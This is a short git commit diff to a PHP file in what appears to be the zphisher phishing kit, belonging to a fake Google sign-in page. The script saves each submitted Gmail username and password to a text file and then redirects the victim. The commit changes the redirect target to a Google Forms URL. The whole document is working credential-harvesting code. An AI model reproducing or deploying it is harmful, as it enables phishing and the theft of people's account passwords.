a37e75737992f88e6ed9bed840a418b4a0a289f4
Girquell <girquell@gmail.com>
2023-04-26 09:50:37 +0200

    modificació del php 26/04 a les 9:50

--- zphisher-master/.sites/google_new/logpasswd.php
+++ zphisher-master/.sites/google_new/logpasswd.php
@@ -1,6 +1,6 @@
 <?php
 
 file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
+header('Location: https://docs.google.com/forms/d/e/1FAIpQLSf8-yieXSUfKhbMut4xYoYjTfj5hIjeo0vqIMmOk6rRRAFjrg/viewform');
 exit();
 ?>
